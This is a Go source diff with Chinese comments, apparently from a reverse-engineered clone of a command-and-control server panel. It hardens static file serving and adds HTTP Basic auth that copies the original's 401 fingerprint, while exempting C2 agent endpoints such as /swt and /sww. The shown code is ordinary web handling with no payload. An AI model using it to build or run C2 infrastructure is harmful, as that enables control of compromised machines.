@@ -8,10 +8,12 @@
 package router
 
 import (
+	"crypto/subtle"
 	"encoding/json"
 	"log"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 	"sync"
 
@@ -132,28 +134,45 @@ func InitRouter() http.Handler {
 
 	mux := http.NewServeMux()
 
-	// SPA 静态资源 + 前端路由回退（跳过 /api 与 /c2）
-	fs := http.FileServer(http.Dir("static"))
+	// 静态资源：按文件精确匹配（原版 4.9.3 黑盒：未知路径一律 404，没有 SPA 回退；
+	// GET / → 302 /index.html；/assets/xxx 不存在 → 404）。
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		if strings.HasPrefix(r.URL.Path, "/api/") || strings.HasPrefix(r.URL.Path, "/c2/") {
+		p := r.URL.Path
+		if strings.HasPrefix(p, "/api/") || strings.HasPrefix(p, "/c2/") {
 			http.NotFound(w, r)
 			return
 		}
-		staticPath := "static" + r.URL.Path
-		if _, err := os.Stat(staticPath); err == nil && !strings.HasSuffix(r.URL.Path, "/") {
-			if strings.HasSuffix(r.URL.Path, ".js") {
-				w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
-			} else if strings.HasSuffix(r.URL.Path, ".css") {
-				w.Header().Set("Content-Type", "text/css; charset=utf-8")
-			}
-			fs.ServeHTTP(w, r)
+		if p == "/" {
+			http.Redirect(w, r, "/index.html", http.StatusFound)
 			return
 		}
-		if strings.HasPrefix(r.URL.Path, "/assets/") {
+		// 只服务真实存在的静态文件（禁止 .. 穿越：Clean 后拼到 static/ 下）。
+		clean := filepath.Clean("/" + p)
+		full := filepath.Join("static", clean)
+		if st, err := os.Stat(full); err != nil || st.IsDir() {
 			http.NotFound(w, r)
 			return
 		}
-		http.ServeFile(w, r, "static/index.html")
+		// 用 ServeContent 而不是 http.FileServer：后者会把 /index.html 301 重定向到 /，
+		// 而原版是直接 200 返回 shell（黑盒实测）。
+		f, err := os.Open(full)
+		if err != nil {
+			http.NotFound(w, r)
+			return
+		}
+		defer f.Close()
+		info, err := f.Stat()
+		if err != nil {
+			http.NotFound(w, r)
+			return
+		}
+		switch {
+		case strings.HasSuffix(p, ".js"):
+			w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
+		case strings.HasSuffix(p, ".css"):
+			w.Header().Set("Content-Type", "text/css; charset=utf-8")
+		}
+		http.ServeContent(w, r, info.Name(), info.ModTime(), f)
 	})
 
 	// 用户信息 / 菜单 / 权限码（黑盒验证的原版响应格式）
@@ -171,18 +190,67 @@ func InitRouter() http.Handler {
 	// C2 Agent 协议端点
 	registerC2AgentRoutes(mux)
 
-	// 管理面板入口（原版 FUN_0193b5e0 注册的 Web 路由 = "/index6us"，11B 加数组已解）
-	mux.HandleFunc("/index6us", func(w http.ResponseWriter, r *http.Request) {
-		http.ServeFile(w, r, "static/index.html")
-	})
-	mux.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
-		http.ServeFile(w, r, "static/admin/index.html")
-	})
-	mux.HandleFunc("/admin/", func(w http.ResponseWriter, r *http.Request) {
-		http.ServeFile(w, r, "static/admin/index.html")
-	})
+	// 原版 web_basic_auth=true 时，静态资源（/、/favicon.ico、/index.html…）要求
+	// HTTP Basic；/api/* 不受保护（黑盒：无 Basic 的 /api/getUserInfo 仍 200）。
+	var handler http.Handler = mux
+	if cfg := utils.GetFullSettings(); cfg != nil && cfg.WebBasicAuth {
+		handler = basicAuthMiddleware(handler, cfg.WebUsername, cfg.WebPassword)
+	}
+	return handler
+}
 
-	return mux
+// basicAuthMiddleware 为静态资源加 HTTP Basic 认证。
+//
+// 黑盒（原版 4.9.3，web_basic_auth=true）：
+//
+//	GET /            无凭证 -> 401 + WWW-Authenticate: Basic realm="Authorization Required"
+//	                           body "401 Unauthorized\n"（17 字节）
+//	GET /favicon.ico 无凭证 -> 401；带正确凭证 -> 200
+//	GET /api/*       无凭证 -> 正常响应（不受保护）
+//
+// 401 的 realm 文案与 body 逐字对齐，便于指纹对照与前端处理。
+func basicAuthMiddleware(next http.Handler, user, pass string) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if !isProtectedStatic(r.URL.Path) {
+			next.ServeHTTP(w, r)
+			return
+		}
+		u, p, ok := r.BasicAuth()
+		if ok && subtleCompare(u, user) && subtleCompare(p, pass) {
+			next.ServeHTTP(w, r)
+			return
+		}
+		w.Header().Set("WWW-Authenticate", `Basic realm="Authorization Required"`)
+		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
+		w.WriteHeader(http.StatusUnauthorized)
+		_, _ = w.Write([]byte("401 Unauthorized\n"))
+	})
+}
+
+// isProtectedStatic 判断路径是否需要 HTTP Basic：
+//
+//	/api/*、/c2/*    → 不保护（原版面板 API 与 agent 端点都不走 Basic）
+//	agent 端点族     → 不保护（/swt /sww /swk /sws /swd /swl /swld /health /ws）
+//	/ 与真实存在的静态文件 → 保护
+//	其它（未知路径） → 不保护，交给 mux 返回 404（黑盒：/login、/index6us 均 404 而非 401）
+func isProtectedStatic(p string) bool {
+	if strings.HasPrefix(p, "/api/") || strings.HasPrefix(p, "/c2/") {
+		return false
+	}
+	switch p {
+	case "/health", "/ws", "/swt", "/sww", "/swk", "/sws", "/swd", "/swl", "/swld":
+		return false
+	}
+	if p == "/" {
+		return true
+	}
+	st, err := os.Stat(filepath.Join("static", filepath.Clean("/"+p)))
+	return err == nil && !st.IsDir()
+}
+
+// subtleCompare 定时安全比较（避免用 == 泄露口令长度/内容前缀）。
+func subtleCompare(a, b string) bool {
+	return subtle.ConstantTimeCompare([]byte(a), []byte(b)) == 1
 }
 
 func extractToken(r *http.Request) string {
